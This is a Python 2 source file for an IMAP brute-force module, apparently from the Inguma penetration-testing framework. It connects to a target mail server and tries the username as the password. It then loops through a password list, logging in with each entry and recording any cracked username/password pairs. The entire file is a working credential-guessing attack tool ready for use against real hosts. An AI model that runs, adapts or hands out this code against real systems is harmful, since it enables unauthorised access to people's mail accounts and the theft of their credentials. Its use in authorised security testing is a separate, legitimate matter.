#!/usr/bin/python

##      CImapBrute.py
#       
#       Copyright 2010 Joxean Koret <joxeankoret@yahoo.es>
#       
#       This program is free software; you can redistribute it and/or modify
#       it under the terms of the GNU General Public License as published by
#       the Free Software Foundation; either version 2 of the License, or
#       (at your option) any later version.
#       
#       This program is distributed in the hope that it will be useful,
#       but WITHOUT ANY WARRANTY; without even the implied warranty of
#       MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#       GNU General Public License for more details.
#       
#       You should have received a copy of the GNU General Public License
#       along with this program; if not, write to the Free Software
#       Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#       MA 02110-1301, USA.

import os
import sys
import time
import string
import socket
import imaplib

from lib.module import CIngumaModule

name = "bruteimap"
brief_description = "A simple IMAP brute force tool"
type = "gather"

class CImapBrute(CIngumaModule):

	waitTime = 0
	timeout = 1
	exploitType = 3
	services = ""
	results = {}
	user = ""
	port = 0

	def __init__(self):
		self.imap = None
		self.tid = None
		self.pwd = ''
		self.share = None

	def help(self):
		print "target = <target host or network>"
		print "port = <port>"
		print "user = <username>"

	def bruteForce(self):
		userList = [self.user, ]
		if self.port == 0:
			self.port = 143

		socket.setdefaulttimeout(self.timeout)
		self.open(self.target, self.port)

		try:
			self.gom.echo( "Trying " + self.user + "/" + self.user )
			self.login(self.user, self.user)
			self.addToDict(self.target + "_passwords", self.user + "/" + self.user)
			self.results[self.user] = self.user
			return True
		except:
			# Well, first try :)
			self.close()
			self.open(self.target, self.port)

		for user in userList:
			for passwd in self.getPasswordList():
				time.sleep(self.waitTime)
				try:
					passwd = passwd.replace("\n", "").replace("\r", "")
					self.gom.echo( "Trying " + user + "/" + passwd + "..." )
					sys.stdout.flush()
					self.login(user, passwd)
					self.addToDict(self.target + "_passwords", self.user + "/" + passwd)
					self.results[user] = passwd

					return True
				except KeyboardInterrupt:
					self.gom.echo( "Aborted." )
					return False
				except:
					self.gom.echo( sys.exc_info()[1] )
					self.close()
					self.open(self.target, self.port)

		return False

	def run(self):
		if self.target == "":
			self.gom.echo( "No target specified" )
			return False
		
		if self.user == "":
			self.gom.echo( "No user specified" )
			return False

		self.bruteForce()
		return True

	def printSummary(self):
		self.gom.echo( "" )
		for x in self.results:
			self.gom.echo( x + "/" + self.results[x] + "\n" )

	def open(self,host,port):
		self.imap = imaplib.IMAP4(host, port)

	def login(self,username, password):
		if not self.imap:
			self.gom.echo( "Open a connection first." )

		self.imap.login(username, password)

	def login_hash(self,username, lmhash, nthash):
		self.gom.echo( "Not applicable" )

	def logoff(self):
		if not self.imap:
			self.gom.echo( "Open a connection first." )

		self.imap.logout()
		self.imap = None

	def close(self):
		if not self.imap:
			print "Open a connection first."

		self.imap.logout();
